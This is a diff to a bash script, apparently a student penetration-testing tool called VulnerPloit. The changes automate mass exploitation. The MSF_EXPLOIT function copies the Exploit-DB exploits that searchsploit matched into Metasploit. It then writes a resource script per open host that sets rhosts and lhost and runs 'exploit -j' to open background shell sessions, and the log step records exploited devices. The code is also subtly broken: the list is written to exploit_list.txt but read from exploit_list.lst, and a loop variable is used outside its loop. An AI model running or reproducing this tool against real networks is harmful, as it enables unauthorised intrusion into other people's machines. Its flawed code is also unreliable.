@@ -1,7 +1,7 @@
 #!/bin/bash
 
 ###########################
-### VULNERMAPPER FUNCTIONS
+### VULNERPLOIT FUNCTIONS
 ###########################
 
 # INSTALL(): installs relevant applications and creates relevant directories
@@ -276,8 +276,8 @@ function HYDRA_BRUTE()
 ### MSF_EXPLOIT FUNCTION
 ###############################
 
-https://myitgeneralist.blogspot.com/2018/09/importing-exploit-db-exploits-into.html
-https://medium.com/swlh/metasploit-framework-basics-part-1-manual-to-automatic-exploitation-8182d0917193
+# https://myitgeneralist.blogspot.com/2018/09/importing-exploit-db-exploits-into.html
+# https://medium.com/swlh/metasploit-framework-basics-part-1-manual-to-automatic-exploitation-8182d0917193
 
 ### DEFINITION
 
@@ -295,40 +295,52 @@ function MSF_EXPLOIT()
 	echo " "
 	
 	### MSF DATABASE SET-UP
-	# start the service for the backend databse of MSF
+	# start the service for the backend database of MSF
 	sudo service postgresql start
 	# initialise MSF database
 	msfdb init
+	cd ~/VulnerPloit/$session/$rangename
 	
 	### EXPLOITATION LOOP
 	
 	for openhost in $(cat nmap_openhosts.lst)
 	
 	do 
-		### IMPORTATION OF EXPLOIT-DB EXPLOITS
-		# extract path of potential exploits identified by SEARCHSPLOIT_VULN()
-		${openhost}_vuln.txt
-		mkdir <path identified by searchsploit>
-		cp /usr/share/exploitdb/exploits/<path identified by searchsploit>/<exploitfile> /usr/share/metasploit-framework/modules/exploits/<path identified by searchsploit>
-		# update database
-		updatedb
+			
+		### EXTRACTION OF EXPLOIT-DB EXPLOITS
+		# extract paths of the potential exploits identified by SEARCHSPLOIT_VULN()
+		echo "$(cat ${openhost}_vuln.txt | grep / | awk '{print $NF}' | sort | uniq | sort )" > exploit_list.txt
 		
-		### RESOURCE SCRIPT
+		### IMPORTATION OF EXPLOITS FROM EXPLOITDB TO MSFDB
+		for exploit_single in $(cat exploit_list.lst) 
+		do
+			cp /usr/share/exploitdb/exploits/$exploit_single /usr/share/metasploit-framework/modules/exploits/$exploit_single
+			# update database
+			updatedb
+		done
 		
-		# run msfconsole without the banner
-		msfconsole -q
-		# for each open host, execute Searchsploit on its enumerated XML file to detect its vulnerabilities
+		### MSF RESOURCE SCRIPTING
+		cd ~/VulnerPloit/$session/$rangename
+		# create a .rc file to act as a script for msf console        
+        	echo "use exploit/$exploit_single" > ${openhost}_msfscript.rc
+        	echo "set rhosts $openhost" >> ${openhost}_msfscript.rc
+		listenerhost=$(echo "$(ifconfig | grep broadcast | awk '{print $2}')")
+        	echo "set lhost $listenerhost" >> ${openhost}_msfscript.rc
+		# include -j to run multiple exploit shells in multiple background sessions
+       		echo "exploit -j" >> ${openhost}_msfscript.rc
 		
-
-		# include exploit -j to run multiple exploit shells in multiple background sessions
-		exploit -j 2>/dev/null
-	
-		#log results in msfshell 
-
+		
+		### EXPLOITATION
+		# use -q to run msfconsole without the banner, and -r to run resource script
+		msfconsole -q -r ${openhost}_msfscript.rc 2>/dev/null -o ${openhost}_msfoutput.txt
+		
+		### TEXT MANIPULATION
+		# delete everything from msfoutput except exploited device, the successful exploit shell, and shell session
+		
 	done
 	
 	### END
-        # let user know that the detection is done
+        # let user know that the exploitation is done
         echo " "
         echo "[+] Metasploit Framework Vulnerability Exploitation has been executed."
         echo " "
@@ -350,6 +362,7 @@ function LOG()
 	### VULNERABILITY LOGGING LOOP
 	# use a for-loop to iterate through the list of open hosts
 	for openhost in $(cat nmap_openhosts.lst)
+	
 	do
 		
 		### SPECIFIC OPEN HOST SUBDIRECTORY
@@ -357,6 +370,8 @@ function LOG()
 		cd ~/VulnerPloit/$session/$rangename
 		mkdir $openhost
 		cd $openhost
+		# make a subdirectory to organise raw output later 
+		mkdir raw_output
 		
 		### SPECIFIC OPEN HOST REPORT
 		# create log file
@@ -406,7 +421,7 @@ function LOG()
 		echo "EXPLOITED DEVICES" >> ${openhost}_vulnmap.txt
 		echo "-----------------" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
-		echo "$(cat ${openhost}_msfshell.txt)" >> ${openhost}_vulnmap.txt
+		echo "$(cat ${openhost}_msfoutput.txt)" >> ${openhost}_vulnmap.txt
 		echo " "
 		
 		### MAKE A COPY FOR COMBINATION LATER
@@ -415,10 +430,12 @@ function LOG()
 		
 		### ORGANISING RAW OUTPUT FILES FOR INDIVIDUAL HOSTS
 		cd ~/VulnerPloit/$session/$rangename
-		mv ${openhost}.enum.xml ~/VulnerPloit/$session/$rangename/$openhost
-		mv ${openhost}.enum.txt ~/VulnerPloit/$session/$rangename/$openhost
-		mv ${openhost}.vuln.txt ~/VulnerPloit/$session/$rangename/$openhost
-		mv ${openhost}.passwords.txt ~/VulnerPloit/$session/$rangename/$openhost
+		mv ${openhost}_enum.xml ~/VulnerPloit/$session/$rangename/$openhost/raw_output
+		mv ${openhost}_enum.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output
+		mv ${openhost}_vuln.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output
+		mv ${openhost}_passwords.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output
+		mv ${openhost}_msfscript.rc ~/VulnerPloit/$session/$rangename/$openhost/raw_output
+		mv ${openhost}_msfoutput.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output
 	
 	done
 	
@@ -518,6 +535,7 @@ function CONSOLE()
 	mask=$(echo $netrange | awk -F/ '{print $2}')
 	rangename=${net}_${mask}
 	mkdir $rangename
+	# subdirectories of discovered hosts will be created during the execution of the LOG() module
 	cd ~/VulnerPloit/$session/$rangename
 	echo "	[+] Directory created: ~/VulnerPloit/$session/$rangename"
 	echo " "
